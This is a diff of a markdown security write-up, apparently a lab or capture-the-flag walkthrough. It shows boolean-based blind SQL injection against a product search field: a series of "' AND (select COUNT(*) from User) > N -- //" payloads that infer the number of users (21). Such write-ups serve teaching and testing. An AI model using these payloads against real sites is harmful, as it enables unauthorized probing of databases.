@@ -124,12 +124,12 @@ We can search for products using a string but this field is vulnerable to sql in
 We can see that products will only appear when on ```' AND TEST -- // ``` the ```TEST``` is true. 
 For example we can use ```' AND ( select COUNT(*) from User ) > NUM  -- //``` to see if the number of users is superior to ```NUM```
 And by doing some queries we can find exact amount.
-```' AND ( select COUNT(*) from User ) > 50  -- //``` is False.
-```' AND ( select COUNT(*) from User ) > 25  -- //``` is False.
-```' AND ( select COUNT(*) from User ) > 12  -- //``` is True.
-```' AND ( select COUNT(*) from User ) > 18  -- //``` is True.
-```' AND ( select COUNT(*) from User ) > 21  -- //``` is False.
-```' AND ( select COUNT(*) from User ) > 20  -- //``` is True.
+- ```' AND ( select COUNT(*) from User ) > 50  -- //``` is False.
+- ```' AND ( select COUNT(*) from User ) > 25  -- //``` is False.
+- ```' AND ( select COUNT(*) from User ) > 12  -- //``` is True.
+- ```' AND ( select COUNT(*) from User ) > 18  -- //``` is True.
+- ```' AND ( select COUNT(*) from User ) > 21  -- //``` is False.
+- ```' AND ( select COUNT(*) from User ) > 20  -- //``` is True.
 So we get that we have 21 users.
 
 #### Weak code
